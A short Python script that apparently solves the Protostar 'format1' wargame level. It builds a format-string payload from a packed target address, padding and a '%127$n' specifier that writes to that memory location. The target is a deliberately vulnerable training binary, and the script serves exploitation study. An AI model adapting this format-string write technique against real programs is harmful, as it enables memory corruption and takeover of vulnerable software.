#!/usr/bin/env python
import struct

path = "/opt/protostar/bin/format1"
addr = struct.pack("<I", 0x8049638)
parm = "A"*2
form = "%127$n"

print addr+parm+form
